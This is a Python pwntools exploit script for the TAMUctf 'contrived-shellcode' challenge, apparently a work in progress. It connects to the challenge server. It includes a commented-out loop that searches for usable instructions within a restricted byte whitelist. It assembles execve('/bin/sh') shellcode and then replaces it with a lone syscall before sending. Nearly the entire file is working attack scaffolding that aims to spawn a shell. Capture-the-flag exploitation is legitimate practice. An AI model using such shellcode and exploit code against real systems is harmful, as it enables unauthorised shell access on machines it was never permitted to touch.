#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="CRITICAL",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        catch syscall open
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="contrived-shellcode")
    else:
        return process(binary)


def split_bytes(byte_string):
    return [byte_string[i:i+1] for i in range(len(byte_string))]

def print_bytes(s):
    res = disasm(s)
    if (('.byte' not in res) and ('bad' not in res)):
       print(res)
"""
whitelist=split_bytes(b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f')

for a in whitelist:
  for b in whitelist:
     print_bytes(a+b)


for a in whitelist:
  for b in whitelist:
    for c in whitelist:
       print_bytes(a+b+c)

for a in whitelist:
  for b in whitelist:
    for c in whitelist:
      for d in whitelist:
         print_bytes(a+b+c+d)
"""

def exploit(p,e,r):

    writable_mem = 0x100

    #first_shell = b"\x04"
    sigshell = asm("""
                    mov rbx, 0x68732f6e69622f
                    push rbx
                    mov eax, 59
                    xor rsi, rsi
                    xor rdx, rdx
                    mov rdi, rsp
                    syscall
                """)

    sigshell = asm("""
                   syscall
                   """)


    p.sendline(sigshell)
    p.interactive()



if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
